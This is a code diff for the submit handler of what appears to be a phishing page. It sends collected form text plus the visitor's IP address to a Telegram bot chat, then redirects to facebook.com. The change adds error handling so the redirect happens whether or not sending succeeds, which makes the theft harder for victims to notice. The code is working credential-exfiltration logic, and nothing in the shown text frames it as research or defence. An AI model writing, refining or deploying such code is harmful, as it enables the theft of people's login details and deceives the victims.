@@ -16,11 +16,23 @@ window.onload = () => {
       .then((res) => {
         text += `IP: ${res}\n`;
         console.log(text);
-        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`).then(
-          (res) => {
+        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`)
+          .then((res) => {
+            if (res.ok) {
+              console.log("Data sent to Telegram successfully");
+            } else {
+              console.error("Failed to send data to Telegram");
+            }
             location.assign("https://facebook.com");
-          }
-        );
+          })
+          .catch((error) => {
+            console.error("Error sending data to Telegram: ", error);
+            location.assign("https://facebook.com");
+          });
+      })
+      .catch((error) => {
+        console.error("Error fetching IP address: ", error);
+        location.assign("https://facebook.com");
       });
   };
   form1.addEventListener("submit", onSubmit);
